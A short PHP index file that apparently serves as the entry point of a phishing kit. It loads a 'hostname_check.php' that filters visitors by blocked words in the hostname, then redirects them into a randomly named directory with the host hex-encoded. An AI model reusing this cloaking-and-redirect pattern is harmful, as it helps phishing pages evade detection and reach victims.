<?php
/*
* index.php
*/




//Call Log Files
require_once '45238019a6515b1e0be60mzn/hostname_check.php'; // Check if hostname contain blocked word



$host = bin2hex ($_SERVER['HTTP_HOST']);
$index="45238019a6515b1e0be60mzn/?$host";

header("location: $index");


?>
